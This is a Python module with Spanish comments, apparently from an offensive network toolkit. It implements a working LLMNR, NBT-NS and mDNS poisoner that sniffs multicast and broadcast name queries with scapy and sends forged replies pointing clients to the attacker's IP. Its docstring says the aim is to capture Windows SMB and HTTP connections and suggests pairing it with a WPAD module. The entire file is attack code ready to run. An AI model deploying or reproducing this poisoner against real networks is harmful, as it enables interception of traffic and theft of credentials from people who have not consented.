"""Poisoners de resolucion de nombres: LLMNR, NBT-NS y mDNS.

Sin tocar ARP: respondemos consultas multicast/broadcast de nombres con
nuestra IP. En redes Windows esto captura conexiones SMB/HTTP hacia
cualquier nombre que el DNS no resuelve (recursos de red, typos, y el
clasico "wpad"). Combinalo con el modulo WPAD.
"""
import socket

from scapy.all import (AsyncSniffer, DNS, DNSQR, DNSRR, Ether, IP, UDP,
                       get_if_addr, send)

from core.bus import bus

# KDE de PMKID no aplica aqui, pero mantenemos el estilo de modulos hermanos.

_FILTER = "udp and (dst port 137 or dst port 5353 or dst port 5355)"


def _decode_nbns_name(chunk: bytes) -> str:
    """Decodifica el nombre first-level-encoded de NBT-NS (RFC 1002)."""
    try:
        raw = chunk[:32]
        out = []
        for i in range(0, 32, 2):
            c = ((raw[i] - 65) << 4) | (raw[i + 1] - 65)
            out.append(c)
        name = bytes(out).decode(errors="ignore").rstrip("\x00 ")
        return name or "?"
    except Exception:
        return "?"


class NamePoisoner:
    """Responde LLMNR / NBT-NS / mDNS con la IP que elijas (por defecto la nuestra)."""

    def __init__(self, iface: str, spoof_ip: str | None = None,
                 llmnr: bool = True, nbtns: bool = True, mdns: bool = True):
        self.iface = iface
        self.spoof_ip = spoof_ip or get_if_addr(iface)
        self.protocols = {"LLMNR": llmnr, "NBT-NS": nbtns, "mDNS": mdns}
        self._sniffer: AsyncSniffer | None = None
        self.hits = 0

    # ------------------------------------------------------------------ LLMNR / mDNS
    def _answer_dns(self, pkt, proto: str, dst: str, dport: int) -> None:
        dns = pkt[DNS]
        if dns.qr or not dns.qd:
            return
        q = dns.qd[0]
        if q.qtype != 1:  # solo consultas A
            return
        name = bytes(q.qname).decode(errors="ignore").rstrip(".")
        self.hits += 1
        bus.emit({"type": "poison", "proto": proto, "name": name, "src": pkt[IP].src})
        resp = (IP(src=self.spoof_ip, dst=dst) /
                UDP(sport=dport, dport=pkt[UDP].sport) /
                DNS(id=dns.id, qr=1, aa=1, qd=dns.qd,
                    an=DNSRR(rrname=q.qname, type="A", rdata=self.spoof_ip, ttl=30)))
        try:
            send(resp, iface=self.iface, verbose=0)
        except Exception:
            pass

    # ------------------------------------------------------------------ NBT-NS
    def _answer_nbns(self, pkt) -> None:
        raw = bytes(pkt[UDP].payload)
        if len(raw) < 48:
            return
        flags = raw[2:4]
        if (int.from_bytes(flags, "big") & 0x8000) or raw[4:6] != b"\x00\x01":
            return  # no es una consulta con exactamente 1 pregunta
        if raw[46:48] != b"\x00\x01":
            return  # solo consultas A (ignora NBSTAT 0x21)
        name = _decode_nbns_name(raw[13:45])
        if name.endswith("\x00"):
            name = name[:-1]
        self.hits += 1
        bus.emit({"type": "poison", "proto": "NBT-NS", "name": name, "src": pkt[IP].src})
        resp = (raw[:2] + b"\x85\x00" +          # TID + flags respuesta
                b"\x00\x00" + b"\x00\x00" + b"\x00\x01" +   # QD=0 AN=1
                b"\x00\x00" + b"\x00\x00" + b"\x00\x00" +   # NS=0 AR=0
                raw[12:46] +                     # nombre codificado completo
                b"\x00\x01" +                    # TYPE = A
                b"\x00\x01" +                    # CLASS = IN
                b"\x00\x04\x93\xe0" +            # TTL 300000
                b"\x00\x06" +                    # RDLENGTH = 6
                b"\x00\x00" +                    # NB_FLAGS
                socket.inet_aton(self.spoof_ip))
        try:
            send(IP(dst=pkt[IP].src) / UDP(sport=137, dport=pkt[UDP].sport) /
                 resp, iface=self.iface, verbose=0)
        except Exception:
            pass

    # ------------------------------------------------------------------ dispatcher
    def _process(self, pkt) -> None:
        if not pkt.haslayer(UDP) or not pkt.haslayer(IP):
            return
        dport = pkt[UDP].dport
        if dport == 5355 and self.protocols["LLMNR"] and pkt.haslayer(DNS):
            self._answer_dns(pkt, "LLMNR", pkt[IP].src, 5355)
        elif dport == 137 and self.protocols["NBT-NS"]:
            self._answer_nbns(pkt)
        elif dport == 5353 and self.protocols["mDNS"] and pkt.haslayer(DNS):
            self._answer_dns(pkt, "mDNS", "224.0.0.251", 5353)

    # ------------------------------------------------------------------ ciclo de vida
    def start(self) -> None:
        active = [p for p, on in self.protocols.items() if on]
        self._sniffer = AsyncSniffer(iface=self.iface, filter=_FILTER,
                                     prn=self._process, store=False)
        self._sniffer.start()
        bus.emit({"type": "poison", "proto": "info",
                  "msg": f"Poisoners activos ({', '.join(active)}) -> {self.spoof_ip}"})

    def stop(self) -> None:
        if self._sniffer:
            try:
                self._sniffer.stop()
            except Exception:
                pass
        bus.emit({"type": "poison", "proto": "info",
                  "msg": f"Poisoners detenidos ({self.hits} nombres interceptados)"})
